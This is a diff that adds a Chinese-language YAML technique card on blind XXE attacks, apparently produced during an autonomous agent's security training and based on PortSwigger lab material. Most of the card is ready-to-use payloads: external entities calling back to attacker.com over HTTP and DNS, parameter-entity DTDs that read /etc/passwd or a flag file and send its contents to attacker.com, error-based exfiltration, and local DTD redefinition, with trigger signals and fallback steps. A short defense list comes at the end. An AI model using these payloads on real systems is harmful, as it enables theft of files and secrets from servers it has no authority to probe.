@@ -1,0 +1,157 @@
+# 技术卡片: 盲 XXE 检测与利用
+# 分类: xxe / injection
+# 版本: 1.0
+# 日期: 2026-07-23
+# 来源: 黑骡自主学习训练（PortSwigger S02 卡片指导）
+
+id: "xxe-blind-oob"
+name: "盲 XXE - 带外检测与数据渗透"
+category: "xxe"
+subcategory: "blind-oob"
+severity: "critical"
+
+description: |
+  当 XML 解析结果不回显时（盲 XXE），需要通过侧信道确认漏洞存在。
+  三种主要方法：
+  1. OOB 回调（HTTP/DNS）— 最可靠，但受解析器网络限制
+  2. 错误消息差异 — 利用存在/不存在资源的不同错误
+  3. 时间延迟 — 引入远程慢资源或死循环
+
+trigger_signals:
+  - "应用接受 XML 但返回统一响应（如 'OK' / HTTP 200 无差异）"
+  - "XML 输入被解析但无内容回显"
+  - "存在文件上传 + XML 解析（如 DOCX 处理、SVG 上传）"
+  - "SOAP API 只返回成功/失败"
+
+payloads:
+  oob_http_payload: |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "http://attacker.com/callback?id=UNIQUE_ID">
+    ]>
+    <data>&xxe;</data>
+  oob_dns_payload: |
+    <!ENTITY xxe SYSTEM "http://UNIQUE_ID.attacker.com/">
+  data_exfil_dtd: |
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+    %eval;
+    %exfil;
+  error_based_payload: |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY % file SYSTEM "file:///etc/passwd">
+      <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+      %eval;
+      %error;
+    ]>
+
+prerequisites:
+  - "应用接受 XML 输入（Content-Type: application/xml 或 text/xml）"
+  - "XML 解析结果不回显（盲 XXE 场景）"
+  - "解析器允许外部 DTD 加载或参数实体处理（OOB 方法需要）"
+  - "出站网络可达（HTTP/DNS 回调）或存在可观测错误差异/时间差异"
+
+detection_methods:
+  method_1_oob:
+    name: "OOB 回调（HTTP/DNS）"
+    prerequisite: "解析器允许出站网络请求"
+    probe_http: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "http://attacker.com/callback?id=UNIQUE_ID">
+      ]>
+      <data>&xxe;</data>
+    probe_dns: |
+      <!ENTITY xxe SYSTEM "http://UNIQUE_ID.attacker.com/">
+    note: "DNS 回调不受 HTTP 协议限制，更可靠"
+    blocked_by: "lxml 6.x 默认禁止网络访问（即使 no_network=False）"
+    
+  method_2_error:
+    name: "错误消息差异"
+    prerequisite: "应用暴露部分错误信息"
+    probe_exist: |
+      <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    probe_nonexist: |
+      <!ENTITY xxe SYSTEM "file:///nonexistent_file_xyz">
+    note: "存在/不存在可能返回不同 HTTP 状态码或错误消息"
+    
+  method_3_timing:
+    name: "时间延迟"
+    prerequisite: "解析器允许 HTTP 并同步等待"
+    probe: |
+      <!ENTITY xxe SYSTEM "http://slow-server.com/delay?sec=5">
+    note: "响应时间差异可作为布尔 oracle"
+
+data_exfiltration:
+  oob_http:
+    name: "OOB HTTP 渗透"
+    description: |
+      通过外部 DTD 将本地文件内容作为 URL 参数发送到攻击者服务器。
+      恶意 DTD 由攻击者托管，其中定义参数实体读取目标文件，再将内容拼接到 HTTP 请求 URL。
+    malicious_dtd: |
+      <!ENTITY % file SYSTEM "file:///tmp/xxe_lab/flag.txt">
+      <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+      %eval;
+      %exfil;
+    target_payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [
+        <!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">
+        %xxe;
+      ]>
+      <data>&exfil;</data>
+    prerequisite: "解析器允许 HTTP 出站 + 外部 DTD 加载"
+    blocked_by: "lxml 6.x 网络限制"
+
+  error_based:
+    name: "错误消息渗透"
+    description: |
+      将文件内容嵌入到必然触发解析错误的路径中，从错误消息中提取内容。
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [
+        <!ENTITY % file SYSTEM "file:///tmp/xxe_lab/flag.txt">
+        <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+        %eval;
+        %error;
+      ]>
+    note: "错误消息可能泄露文件路径（即文件内容）"
+
+  local_dtd:
+    name: "本地 DTD 重新定义"
+    description: |
+      利用目标系统上已有的 DTD 文件，重新定义其中的参数实体实现数据渗透。
+      无需攻击者托管外部 DTD。
+    technique: "搜索系统上可写的 DTD 文件（/usr/share/ 下），重新定义其中的实体"
+    advantage: "不依赖外部网络 — 突破网络隔离限制"
+    example_system_dtds:
+      - "/usr/share/yelp/dtd/docbookx.dtd"
+      - "/usr/share/xml/fontconfig/fonts.dtd"
+
+success_indicators:
+  - "OOB 收到唯一标记的回调请求"
+  - "错误消息包含目标文件内容"
+  - "DNS 日志出现唯一子域名查询"
+
+failure_fallback:
+  - "DNS/HTTP 无回调 → 检查解析器是否配置了网络代理或完全禁网"
+  - "所有方法失败 → 确认 XML 是否真正被解析（测试内联实体）"
+  - "DTD 加载报错 → 实体可能被禁用，转测 XInclude"
+
+defense:
+  - "禁用 DTD 和外部实体（彻底方案）"
+  - "配置出站防火墙限制解析器网络访问"
+  - "XML 解析器使用沙箱/低权限运行"
+  - "错误消息统一化，不暴露解析器内部状态"
+
+notes_from_training:
+  - "lxml 6.1.1 的 no_network=False 参数实际上不生效——这是现代解析器的安全趋势"
+  - "file:// 协议在 lxml 6.x 中仍然可用——意味着即使禁网，本地文件读取仍然危险"
+  - "DNS OOB 是比 HTTP OOB 更可靠的方法（DNS 查询通常不被防火墙拦截）"
+
+sources:
+  - reference: "PortSwigger Web Security Academy - Blind XXE"
+  - reference: "OWASP - XML External Entity Prevention Cheat Sheet"
+  - reference: "CWE-611"
+  - training: "2026-07-23 黑骡自主学习"
